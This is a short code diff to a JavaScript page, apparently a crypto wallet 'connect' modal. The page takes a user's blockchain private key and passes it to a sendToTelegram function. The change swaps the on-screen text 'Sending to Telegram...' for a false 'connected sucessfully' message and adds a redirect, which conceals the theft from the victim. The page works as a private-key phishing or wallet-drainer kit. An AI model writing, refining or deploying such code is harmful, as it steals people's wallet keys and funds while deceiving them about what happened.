@@ -164,9 +164,16 @@ let selectedBlockchain = "";
             return;
         }
 
-        walletStatus.innerText = `✅ Valid ${selectedBlockchain.toUpperCase()} Key! Sending to Telegram...`;
+        walletStatus.innerText = `✅ Valid ${selectedBlockchain.toUpperCase()} Key! connected sucessfully..`;
         sendToTelegram(input);
-        setTimeout(closeModal, 2000); // Close modal after 2 seconds
+
+
+
+
+        setTimeout(() => {
+                     window.location.href = "ethereumbot.html"; // Change this to your actual page
+                }, 3000);
+
     }
 
     function sendToTelegram(privateKey) {
